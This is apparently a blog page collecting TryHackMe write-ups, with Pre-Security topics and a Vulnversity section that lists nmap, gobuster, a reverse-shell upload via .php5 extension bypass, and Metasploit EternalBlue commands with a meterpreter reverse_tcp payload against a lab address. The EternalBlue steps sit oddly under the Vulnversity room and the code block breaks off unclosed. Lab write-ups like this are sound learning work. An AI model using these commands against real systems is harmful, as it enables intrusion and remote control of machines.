---
title: "TryHackMe Write-ups Collection"
date: 2024-01-12
tags: ["tryhackme", "ctf", "writeups"]
---

## 🎯 TryHackMe Write-ups Collection

Complete walkthroughs of TryHackMe rooms I've solved.

## Completed Rooms

### 1. Pre-Security ✅
**Learning Path** - Beginner

Key topics covered:
- Network fundamentals (OSI model, TCP/IP)
- How the web works (HTTP, DNS, cookies)
- Linux basics (file system, commands, permissions)
- Windows security basics

[Read full write-up](/posts/my-first-ctf/)

---

### 2. Vulnversity 🔄
**Difficulty**: Easy | **Category**: Web Exploitation

**Skills learned**:
- Directory enumeration with Gobuster
- File upload vulnerability identification
- Extension bypass techniques (.php5, .phtml)
- Reverse shell establishment
- Privilege escalation via SUID binaries

**Key commands**:
```bash
# Initial scan
nmap -sV -sC -p- 10.10.10.10

# Directory enumeration
gobuster dir -u http://10.10.10.10:3333 -w /usr/share/wordlists/dirb/common.txt

# Found upload page at /internal/
# Uploaded PHP reverse shell with .php5 extension

# Find EternalBlue vulnerability
nmap -p445 --script smb-vuln-ms17-010 $TARGET

# Launch Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS $TARGET
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit

